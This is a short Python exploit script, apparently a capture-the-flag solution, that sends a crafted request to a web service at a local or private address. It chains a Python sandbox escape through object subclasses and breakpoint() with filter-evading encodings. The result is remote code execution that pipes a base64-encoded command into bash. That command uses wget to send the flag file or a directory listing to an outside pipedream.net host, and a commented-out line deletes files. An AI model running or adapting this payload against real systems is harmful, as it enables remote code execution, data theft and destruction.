import urllib.parse
import requests
import base64

target = "http://10.99.66.7:10003"
target = "http://localhost:10003"

#cmd = b'wget https://eoy83wfm7h6bodb.m.pipedream.net?a=`ls /|base64 -w 0`'
cmd = b'wget https://eoy83wfm7h6bodb.m.pipedream.net?a=`cat /flag_*`'
#cmd = b'rm /flag_*'
cmd = base64.b64encode(cmd).decode()

rce_exploit = f"''.__class__.__base__.__subclasses__().__getitem__(123).load_module('os').system('echo'+chr(32)+'{cmd}'+chr(124)+'base64'+chr(32)+'-d'+chr(124)+'bash')"

rce_exploit_len = len(rce_exploit)
print(rce_exploit_len)

payload = f"breakpoint(commands=[str(request['query\\x5fstring'],'utf-8')[1:{rce_exploit_len+2}],'c'])"
payload = f"breakpoint(commands=[str(request['query\\x5fstring'])[3:229]])"
#payload = f"breakpoint(commands=[\"exec(request['query\x5fstring'][109:])\"])"

payload = f"{target}/SsTiMe?{rce_exploit}&q={payload}" 

r = requests.get(payload)

payload_len = len(payload)

print(f"{payload_len=}")
print(f"{payload=}")
print(r.url)
print(r.text)
